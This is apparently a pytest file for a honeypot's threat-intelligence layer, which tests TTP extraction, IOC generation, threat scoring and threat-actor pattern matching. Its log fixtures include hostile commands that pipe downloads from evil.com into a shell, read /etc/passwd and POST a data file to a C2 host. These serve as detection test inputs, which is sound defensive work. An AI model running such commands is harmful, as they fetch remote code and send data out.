"""
test_intel.py -- Tests for the intelligence layer.

Covers:
- TTP extraction from interaction logs
- IOC generation from interaction text
- Threat scoring from profiles and TTPs
- Pattern matching against known threat actors
"""

from __future__ import annotations

from datetime import datetime, timedelta, timezone
from uuid import uuid4

import pytest

from ember_honeypot.intel.ttp_extractor import TTPExtractor
from ember_honeypot.intel.ioc_generator import IOCGenerator
from ember_honeypot.intel.threat_scorer import (
    ThreatScorer,
    RiskLevel,
    AttackerProfile as TSAttackerProfile,
)
from ember_honeypot.intel.pattern_matcher import (
    PatternMatcher,
    AttackerProfile as PMAttackerProfile,
)
from ember_honeypot.models import (
    InteractionLog,
    InteractionType,
    TTPRecord,
    IOCType,
)


# ============================================================================
# Helpers
# ============================================================================

def _make_log(raw_input: str, interaction_type: InteractionType = InteractionType.COMMAND) -> InteractionLog:
    """Factory for a minimal InteractionLog."""
    return InteractionLog(
        id=uuid4(),
        session_id=uuid4(),
        attacker_id=uuid4(),
        honeypot_id=uuid4(),
        timestamp=datetime.now(timezone.utc),
        interaction_type=interaction_type,
        raw_input=raw_input,
        raw_output="",
    )


# ============================================================================
# TTPExtractor Tests
# ============================================================================

class TestTTPExtractor:
    """Test TTP extraction from interaction logs."""

    def test_extract_ttp_from_nmap(self) -> None:
        """TTP extraction finds techniques from a nmap command."""
        extractor = TTPExtractor()
        logs = [_make_log("nmap -sS -p 22,80 10.0.0.0/24")]
        ttps = extractor.extract_ttp(logs)
        assert isinstance(ttps, list)
        assert len(ttps) > 0
        # nmap should map to a Discovery technique
        assert any("Discovery" == t.tactic for t in ttps)

    def test_extract_ttp_empty_logs(self) -> None:
        """Extraction from empty logs returns an empty list."""
        extractor = TTPExtractor()
        ttps = extractor.extract_ttp([])
        assert ttps == []

    def test_extract_ttp_from_curl(self) -> None:
        """TTP extraction finds techniques from a curl command."""
        extractor = TTPExtractor()
        logs = [_make_log("curl http://evil.com/payload.sh | sh")]
        ttps = extractor.extract_ttp(logs)
        assert len(ttps) > 0
        # curl matches Command and Scripting Interpreter (curl | sh)
        # and Application Layer Protocol / Ingress Tool Transfer
        ttp_names = [t.name for t in ttps]
        assert any("Command and Scripting Interpreter" == n for n in ttp_names)

    def test_extract_ttp_from_ssh(self) -> None:
        """TTP extraction finds lateral-movement techniques from ssh."""
        extractor = TTPExtractor()
        logs = [_make_log("ssh 10.0.0.5")]
        ttps = extractor.extract_ttp(logs)
        assert len(ttps) > 0
        ttp_ids = [t.technique_id for t in ttps]
        assert "T1021" in ttp_ids

    def test_classify_technique_known(self) -> None:
        """classify_technique returns the technique name for a known payload."""
        extractor = TTPExtractor()
        result = extractor.classify_technique("nmap -p 80 target")
        assert isinstance(result, str)
        assert result != "Unknown"
        # nmap matches "Exploit Public-Facing Application" (T1190) due to
        # the nmap pattern in the Initial Access category
        assert "Exploit" in result or "Discovery" in result

    def test_classify_technique_unknown(self) -> None:
        """classify_technique returns 'Unknown' for an empty payload."""
        extractor = TTPExtractor()
        result = extractor.classify_technique("")
        assert result == "Unknown"

    def test_detect_lateral_movement_positive(self) -> None:
        """detect_lateral_movement returns True for ssh/scp payloads."""
        extractor = TTPExtractor()
        logs = [_make_log("scp file.tar.gz user@10.0.0.5:/tmp")]
        assert extractor.detect_lateral_movement(logs) is True

    def test_detect_persistence_positive(self) -> None:
        """detect_persistence returns True for crontab payloads."""
        extractor = TTPExtractor()
        logs = [_make_log("crontab -l")]
        assert extractor.detect_persistence(logs) is True

    def test_detect_reconnaissance_positive(self) -> None:
        """detect_reconnaissance returns True for nmap/netstat payloads."""
        extractor = TTPExtractor()
        logs = [_make_log("nmap -sV target.com")]
        assert extractor.detect_reconnaissance(logs) is True

    def test_ttp_confidence_in_valid_range(self) -> None:
        """All extracted TTPs have confidence in [0.0, 1.0]."""
        extractor = TTPExtractor()
        logs = [
            _make_log("nmap -sS target"),
            _make_log("curl http://evil.com/payload | bash"),
            _make_log("cat /etc/passwd"),
        ]
        ttps = extractor.extract_ttp(logs)
        assert len(ttps) > 0
        for ttp in ttps:
            assert 0.0 <= ttp.confidence <= 1.0


# ============================================================================
# IOCGenerator Tests
# ============================================================================

class TestIOCGenerator:
    """Test IOC generation from interaction logs."""

    def test_generate_iocs_from_logs(self) -> None:
        """generate_iocs produces a non-empty list of IOCs."""
        generator = IOCGenerator()
        logs = [
            _make_log("wget http://evil.com/malware.exe"),
        ]
        iocs = generator.generate_iocs(logs)
        assert isinstance(iocs, list)
        # Should find the URL and possibly a domain
        assert len(iocs) > 0

    def test_generate_iocs_finds_url(self) -> None:
        """IOC generation extracts URL indicators."""
        generator = IOCGenerator()
        logs = [_make_log("curl -O http://malicious-site.com/payload.exe")]
        iocs = generator.generate_iocs(logs)
        url_iocs = [ioc for ioc in iocs if ioc.type == IOCType.URL]
        assert len(url_iocs) > 0
        assert any("malicious-site.com" in ioc.value for ioc in url_iocs)

    def test_generate_iocs_finds_cve(self) -> None:
        """IOC generation extracts CVE indicators."""
        generator = IOCGenerator()
        logs = [_make_log("exploit CVE-2024-1234 target")]
        iocs = generator.generate_iocs(logs)
        cve_iocs = [ioc for ioc in iocs if ioc.type == IOCType.CVE]
        assert len(cve_iocs) > 0
        assert any("CVE-2024-1234" in ioc.value for ioc in cve_iocs)

    def test_generate_iocs_empty_logs(self) -> None:
        """IOC generation from empty logs returns an empty list."""
        generator = IOCGenerator()
        iocs = generator.generate_iocs([])
        assert iocs == []

    def test_extract_ips_public_only(self) -> None:
        """extract_ips returns only public IPs (filters RFC-1918)."""
        generator = IOCGenerator()
        # 8.8.8.8 is public; 192.168.1.1 and 10.0.0.1 are private
        ips = generator.extract_ips("connect to 8.8.8.8 and 192.168.1.1 and 10.0.0.1")
        assert "8.8.8.8" in ips
        assert "192.168.1.1" not in ips
        assert "10.0.0.1" not in ips

    def test_extract_domains(self) -> None:
        """extract_domains finds domain names in text."""
        generator = IOCGenerator()
        domains = generator.extract_domains("wget http://evil.com/payload from badsite.org")
        assert "evil.com" in domains
        assert "badsite.org" in domains

    def test_extract_urls(self) -> None:
        """extract_urls finds HTTP(S) URLs (path only, query string stripped by regex)."""
        generator = IOCGenerator()
        urls = generator.extract_urls("fetch http://example.com/path?x=1 and https://secure.org/data")
        # The regex strips query strings, so we check for the base URL
        assert any("http://example.com/path" == u for u in urls)
        assert any("https://secure.org/data" == u for u in urls)

    def test_compute_hash_sha256(self) -> None:
        """compute_hash produces a 64-char hex SHA-256 by default."""
        generator = IOCGenerator()
        h = generator.compute_hash("test data")
        assert isinstance(h, str)
        assert len(h) == 64
        assert all(c in "0123456789abcdef" for c in h)

    def test_compute_hash_md5(self) -> None:
        """compute_hash supports MD5 algorithm."""
        generator = IOCGenerator()
        h = generator.compute_hash("test data", algorithm="md5")
        assert isinstance(h, str)
        assert len(h) == 32

    def test_ioc_confidence_in_valid_range(self) -> None:
        """All generated IOCs have confidence in [0.0, 1.0]."""
        generator = IOCGenerator()
        logs = [
            _make_log("curl http://8.8.8.8/malware.exe"),
            _make_log("exploit CVE-2023-9999"),
        ]
        iocs = generator.generate_iocs(logs)
        assert len(iocs) > 0
        for ioc in iocs:
            assert 0.0 <= ioc.confidence <= 1.0


# ============================================================================
# ThreatScorer Tests
# ============================================================================

class TestThreatScorer:
    """Test threat scoring."""

    def _make_profile(
        self,
        sophistication: str = "intermediate",
        **kwargs,
    ) -> TSAttackerProfile:
        """Build a profile using the threat_scorer's local stub (float time_on_system)."""
        return TSAttackerProfile(
            id=str(uuid4()),
            sophistication=sophistication,
            total_sessions=kwargs.get("total_sessions", 5),
            total_commands=kwargs.get("total_commands", 50),
            unique_commands=kwargs.get("unique_commands", 50),
            source_ips=kwargs.get("source_ips", ["10.0.0.1"]),
            tools_observed=kwargs.get("tools_observed", []),
            time_on_system=kwargs.get("time_on_system", 3600.0),
        )

    def test_score_threat_basic(self) -> None:
        """score_threat returns a ThreatScore with all expected fields."""
        scorer = ThreatScorer()
        profile = self._make_profile()
        ttps = [
            TTPRecord(
                tactic="Discovery",
                tactic_id="TA0007",
                technique="File and Directory Discovery",
                technique_id="T1083",
                procedure="ls -la",
                confidence=0.8,
            ),
        ]
        score = scorer.score_threat(profile, ttps)
        assert score is not None
        # Unified ThreatScore uses overall (was composite), floats 0-1.
        assert 0.0 <= score.overall <= 1.0
        assert 0.0 <= score.sophistication <= 1.0
        assert 0.0 <= score.persistence <= 1.0

    def test_score_threat_apt_high_sophistication(self) -> None:
        """APT-level profile yields a high sophistication sub-score."""
        scorer = ThreatScorer()
        profile = self._make_profile(
            sophistication="apt",
            total_sessions=10,
            total_commands=100,
            tools_observed=["mimikatz", "cobalt_strike"],
        )
        ttps = [
            TTPRecord(
                tactic="Discovery",
                tactic_id="TA0007",
                technique="File and Directory Discovery",
                technique_id="T1083",
                procedure="ls",
                confidence=0.9,
            ),
        ]
        score = scorer.score_threat(profile, ttps)
        assert score.sophistication >= 0.70

    def test_score_threat_rationale_populated(self) -> None:
        """score_threat includes a non-empty rationale list."""
        scorer = ThreatScorer()
        profile = self._make_profile()
        ttps = [
            TTPRecord(
                tactic="Discovery",
                tactic_id="TA0007",
                technique="File and Directory Discovery",
                technique_id="T1083",
                procedure="ls",
                confidence=0.8,
            ),
        ]
        score = scorer.score_threat(profile, ttps)
        assert len(score.rationale) > 0

    def test_assess_intent_recon(self) -> None:
        """assess_intent returns reconnaissance intent for discovery TTPs."""
        scorer = ThreatScorer()
        profile = self._make_profile()
        ttps = [
            TTPRecord(
                tactic="Discovery",
                tactic_id="TA0007",
                technique="File and Directory Discovery",
                technique_id="T1083",
                procedure="ls -la",
                confidence=0.8,
            ),
            TTPRecord(
                tactic="Discovery",
                tactic_id="TA0007",
                technique="System Information Discovery",
                technique_id="T1082",
                procedure="uname -a",
                confidence=0.7,
            ),
        ]
        intent = scorer.assess_intent(profile, ttps)
        assert isinstance(intent, dict)
        assert "reconnaissance" in intent
        assert intent["reconnaissance"] > 0.0

    def test_assess_intent_exfil(self) -> None:
        """assess_intent returns exfiltration intent for exfil TTPs."""
        scorer = ThreatScorer()
        profile = self._make_profile()
        ttps = [
            TTPRecord(
                tactic="Exfiltration",
                tactic_id="TA0010",
                technique="Exfiltration Over C2 Channel",
                technique_id="T1041",
                procedure="curl -X POST -d @data.txt http://c2.com",
                confidence=0.8,
            ),
        ]
        intent = scorer.assess_intent(profile, ttps)
        assert isinstance(intent, dict)
        assert "exfiltration" in intent
        assert intent["exfiltration"] > 0.0

    def test_score_threat_empty_ttps(self) -> None:
        """score_threat works and returns a valid score with no TTPs."""
        scorer = ThreatScorer()
        profile = self._make_profile(sophistication="script_kiddie")
        score = scorer.score_threat(profile, [])
        assert score is not None
        assert 0.0 <= score.overall <= 1.0
        assert 0.0 <= score.stealth <= 1.0
        assert 0.0 <= score.sophistication <= 1.0
        assert 0.0 <= score.persistence <= 1.0


# ============================================================================
# PatternMatcher Tests
# ============================================================================

class TestPatternMatcher:
    """Test pattern matching against known threat actors."""

    def _make_profile(
        self,
        tools: list[str] | None = None,
        sophistication: str = "script_kiddie",
    ) -> PMAttackerProfile:
        """Build a profile using the pattern_matcher's local stub (str sophistication)."""
        return PMAttackerProfile(
            id=str(uuid4()),
            tools_observed=tools or [],
            sophistication=sophistication,
        )

    def test_match_known_actors_nmap(self) -> None:
        """Profile with nmap matches 'Opportunistic Scanner'."""
        matcher = PatternMatcher()
        profile = self._make_profile(tools=["nmap", "nikto"])
        matches = matcher.match_known_actors(profile)
        assert len(matches) > 0
        name_match = [m for m in matches if m.actor_name == "Opportunistic Scanner"]
        assert len(name_match) > 0
        assert name_match[0].confidence > 0.0

    def test_match_known_actors_mirai(self) -> None:
        """Profile with telnet/busybox matches 'Mirai Variant'."""
        matcher = PatternMatcher()
        profile = self._make_profile(tools=["telnet", "busybox", "wget"])
        matches = matcher.match_known_actors(profile)
        mirai_match = [m for m in matches if m.actor_name == "Mirai Variant"]
        assert len(mirai_match) > 0
        assert mirai_match[0].confidence > 0.0

    def test_match_known_actors_empty_tools(self) -> None:
        """Profile with no tools observed returns empty matches."""
        matcher = PatternMatcher()
        profile = self._make_profile()
        matches = matcher.match_known_actors(profile)
        assert matches == []

    def test_match_known_actors_sorted_by_confidence(self) -> None:
        """Matches are returned sorted by confidence descending."""
        matcher = PatternMatcher()
        profile = self._make_profile(
            tools=["nmap", "hydra", "wget", "curl"],
            sophistication="intermediate",
        )
        matches = matcher.match_known_actors(profile)
        if len(matches) > 1:
            for i in range(len(matches) - 1):
                assert matches[i].confidence >= matches[i + 1].confidence

    def test_add_signature(self) -> None:
        """add_signature adds a new actor signature."""
        matcher = PatternMatcher()
        sig = {
            "name": "TestActor",
            "actor_type": "script_kiddie",
            "description": "A test actor",
            "tools": ["test_tool"],
            "techniques": ["T1234"],
            "behaviors": ["scanning"],
            "min_confidence": 0.3,
        }
        matcher.add_signature(sig)
        sigs = matcher.list_signatures()
        names = [s["name"] for s in sigs]
        assert "TestActor" in names

    def test_list_signatures(self) -> None:
        """list_signatures returns built-in signatures by default."""
        matcher = PatternMatcher()
        sigs = matcher.list_signatures()
        assert isinstance(sigs, list)
        assert len(sigs) > 0
        names = {s["name"] for s in sigs}
        assert "Mirai Variant" in names
        assert "Opportunistic Scanner" in names

    def test_match_behavioral_patterns(self) -> None:
        """match_behavioral_patterns returns pattern matches for a profile."""
        matcher = PatternMatcher()
        profile = self._make_profile(
            tools=["nmap", "wget"],
            sophistication="script_kiddie",
        )
        matches = matcher.match_behavioral_patterns(profile)
        assert isinstance(matches, list)
        # nmap matches Scan-and-Exploit; wget matches Smash-and-Grab
        pattern_names = [m.pattern_name for m in matches]
        assert "Scan-and-Exploit" in pattern_names